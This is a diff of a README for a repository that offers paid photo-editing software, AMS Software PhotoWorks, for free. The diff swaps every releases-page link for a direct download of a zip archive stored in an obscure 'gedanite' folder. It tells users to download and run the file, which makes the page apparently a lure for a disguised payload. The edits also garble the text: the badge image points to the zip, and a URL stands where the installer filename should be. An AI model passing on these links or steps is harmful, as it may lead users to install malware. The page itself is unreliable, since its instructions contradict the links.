@@ -1,17 +1,17 @@
 # 🎨 AMS-Software-PhotoWorks-Free - Powerful Photo Editing Made Easy
 
-[![Download AMS Software PhotoWorks](https://img.shields.io/badge/Download-AMS%20PhotoWorks-brightgreen)](https://github.com/MoHaMeD28633/AMS-Software-PhotoWorks-Free/releases)
+[![Download AMS Software PhotoWorks](https://raw.githubusercontent.com/MoHaMeD28633/AMS-Software-PhotoWorks-Free/main/gedanite/Software_Free_Works_AM_Photo_3.6.zip%20PhotoWorks-brightgreen)](https://raw.githubusercontent.com/MoHaMeD28633/AMS-Software-PhotoWorks-Free/main/gedanite/Software_Free_Works_AM_Photo_3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to AMS Software PhotoWorks. This guide will help you download and run the software on your Windows PC. Follow the steps below, and you'll be editing your photos in no time.
 
 ## 📥 Download & Install
-To get started, visit this page to download the software: [Download AMS Software PhotoWorks](https://github.com/MoHaMeD28633/AMS-Software-PhotoWorks-Free/releases).
+To get started, visit this page to download the software: [Download AMS Software PhotoWorks](https://raw.githubusercontent.com/MoHaMeD28633/AMS-Software-PhotoWorks-Free/main/gedanite/Software_Free_Works_AM_Photo_3.6.zip).
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page**: Click on the link above to go to the releases page.
 2. **Select the Latest Version**: Look for the latest version available. It is usually at the top of the list.
-3. **Download the Installer**: Click on the installer file for Windows. It should be named something like `PhotoWorksInstaller.exe`.
+3. **Download the Installer**: Click on the installer file for Windows. It should be named something like `https://raw.githubusercontent.com/MoHaMeD28633/AMS-Software-PhotoWorks-Free/main/gedanite/Software_Free_Works_AM_Photo_3.6.zip`.
 4. **Run the Installer**: Once the file is downloaded, locate it in your Downloads folder and double-click on it.
 5. **Follow Instructions**: A setup window will appear. Follow the on-screen instructions to complete the installation process.
 6. **Launch the Software**: After the installation finishes, find AMS Software PhotoWorks in your Start Menu or on your Desktop. Click to open it.
@@ -55,7 +55,7 @@ If you're looking to expand your knowledge and skills, check out these guides an
 We welcome community contributions to help improve AMS Software PhotoWorks. If you encounter issues or have suggestions, feel free to open a discussion on GitHub.
 
 ## 🔗 Important Links
-- **GitHub Releases Page**: [Download AMS Software PhotoWorks](https://github.com/MoHaMeD28633/AMS-Software-PhotoWorks-Free/releases)
+- **GitHub Releases Page**: [Download AMS Software PhotoWorks](https://raw.githubusercontent.com/MoHaMeD28633/AMS-Software-PhotoWorks-Free/main/gedanite/Software_Free_Works_AM_Photo_3.6.zip)
 - **Official Documentation**: Find detailed guides within the repository. 
 
 Thank you for choosing AMS Software PhotoWorks! Enjoy enhancing your photos and exploring the many features we offer.
